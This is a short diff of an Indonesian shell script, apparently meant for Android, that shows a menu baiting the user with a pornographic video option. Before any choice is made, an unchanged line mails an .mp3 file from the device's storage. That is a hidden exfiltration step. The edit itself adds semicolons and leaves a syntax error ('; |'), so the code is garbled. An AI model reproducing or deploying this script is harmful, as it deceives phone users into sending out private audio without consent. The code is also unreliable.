@@ -18,12 +18,12 @@ echo -n "Waktu system   :"; date
 echo -n "Anda           :"; whoami
 echo -n "Banyak pemakai :"; who | wc -l
 
-echo "Katakan sesuatu..." | sleep 5s | clear
-echo "Pilih tema yang anda sukai :"
-echo "1. Video Bokep"
-echo "2. Nyalakan senter"
-echo "3. Dengarkan suara anda."
-echo "4. Keluar"
+echo "Katakan sesuatu..."; | sleep 5s | clear
+echo "Pilih tema yang anda sukai :";
+echo "1. Video Bokep";
+echo "2. Nyalakan senter";
+echo "3. Dengarkan suara anda.";
+echo "4. Keluar";
 mail -s "Kirimannya gan" -a /storage/emulated/0/nama.mp3
 read -p "Silahkan pilih :" memilih;
 
